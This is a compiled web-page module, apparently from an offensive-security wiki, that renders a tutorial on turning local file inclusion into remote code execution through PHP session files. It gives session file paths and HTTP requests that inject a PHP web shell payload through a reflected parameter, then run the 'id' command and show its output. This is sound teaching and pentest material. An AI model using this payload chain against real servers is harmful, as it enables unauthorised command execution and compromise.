import{_ as e,c as i,a5 as a,o as t}from"./chunks/framework.B5CpDqM0.js";const u=JSON.parse('{"title":"PHP session","description":"","frontmatter":{"authors":"ShutdownRepo"},"headers":[],"relativePath":"web/inputs/file-inclusion/lfi-to-rce/php-session.md","filePath":"web/inputs/file-inclusion/lfi-to-rce/php-session.md","lastUpdated":1724982529000}'),n={name:"web/inputs/file-inclusion/lfi-to-rce/php-session.md"};function l(p,s,o,h,d,r){return t(),i("div",null,s[0]||(s[0]=[a(`<h1 id="php-session" tabindex="-1">PHP session <a class="header-anchor" href="#php-session" aria-label="Permalink to &quot;PHP session&quot;">â€‹</a></h1><p>When a web server wants to handle sessions, it can use PHP session cookies (<code>PHPSESSID</code>).</p><ol><li>Finding where the sessions are stored.</li></ol><p>Examples:</p><ul><li>Linux : <code>/var/lib/php5/sess_[PHPSESSID]</code></li><li>Linux : <code>/var/lib/php/sessions/sess_[PHPSESSID]</code></li><li>Windows : <code>C:\\Windows\\Temp\\</code></li></ul><ol start="2"><li>Displaying a <code>PHPSESSID</code> to see if any parameter is reflected inside.</li></ol><p>Example:</p><ul><li>The user name for the session (from a parameter called <code>user</code>)</li><li>The language used by the user (from a parameter called <code>lang</code>)</li></ul><p><em>Exemple :</em></p><div class="language-http vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">http</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">GET</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /?user=/var/lib/php/sessions/sess_[PHPSESSID] HTTP/2</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">username|s:6:&quot;tester&quot;;lang|s:7:&quot;English&quot;;</span></span></code></pre></div><p>3. Inject some PHP code in the reflected parameter in the session</p><div class="language-http vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">http</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">GET</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /?user=&lt;%3fphp+system($_GET[&#39;cmd&#39;])%3b+%3f&gt; HTTP/2</span></span></code></pre></div><p>4. Call the <code>session file</code>with the vulnerable parameter to trigger a command exection</p><div class="language-http vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">http</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">GET</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /?user=/var/lib/php/sessions/sess_[PHPSESSID]&amp;cmd=id HTTP/2</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">h2</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt; username|s:30:&quot;uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&quot;;lang|s:7:&quot;English&quot;;</span></span></code></pre></div>`,14)]))}const k=e(n,[["render",l]]);export{u as __pageData,k as default};
